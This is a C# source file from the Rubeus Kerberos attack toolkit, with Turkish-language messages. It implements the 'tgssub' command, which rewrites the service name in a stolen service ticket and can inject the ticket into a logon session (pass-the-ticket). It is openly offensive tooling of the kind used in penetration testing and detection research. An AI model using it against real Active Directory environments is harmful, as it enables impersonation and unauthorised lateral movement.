using System;
using System.Collections.Generic;
using System.IO;
using Rubeus.lib.Interop;


namespace Rubeus.Commands
{
    public class Tgssub : ICommand
    {
        public static string CommandName => "tgssub";

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("\r\n[*] Eylem: Servis Ticket sname Yerine Koyma\r\n");

            string altservice = "";
            LUID luid = new LUID();
            bool ptt = false;
            string srealm = "";

            if (arguments.ContainsKey("/luid"))
            {
                try
                {
                    luid = new LUID(arguments["/luid"]);
                }
                catch
                {
                    Console.WriteLine("[X] Gecersiz LUID formati ({0})\r\n", arguments["/luid"]);
                    return;
                }
            }

            if (arguments.ContainsKey("/ptt"))
            {
                ptt = true;
            }

            if (arguments.ContainsKey("/altservice"))
            {
                altservice = arguments["/altservice"];
            }
            else
            {
                Console.WriteLine("\r\n[X] Bir /altservice:SNAME veya /altservice:SNAME/host saglanmalidir!\r\n");
                return;
            }
            
            if(arguments.ContainsKey("/srealm"))
            {
                srealm = arguments["/srealm"];
            }

            if (arguments.ContainsKey("/ticket"))
            {
                string kirbi64 = arguments["/ticket"];

                if (Helpers.IsBase64String(kirbi64))
                {
                    byte[] kirbiBytes = Convert.FromBase64String(kirbi64);
                    KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
                    LSA.SubstituteTGSSname(kirbi, altservice, ptt, luid, srealm);
                }
                else if (File.Exists(kirbi64))
                {
                    byte[] kirbiBytes = File.ReadAllBytes(kirbi64);
                    KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
                    LSA.SubstituteTGSSname(kirbi, altservice, ptt, luid, srealm);
                }
                else
                {
                    Console.WriteLine("\r\n[X]/ticket:X bir .kirbi dosyasi veya base64 kodlu bir .kirbi olmalidir\r\n");
                }
                return;
            }
            else
            {
                Console.WriteLine("\r\n[X] Bir /ticket:X saglanmalidir!\r\n");
                return;
            }
        }
    }
}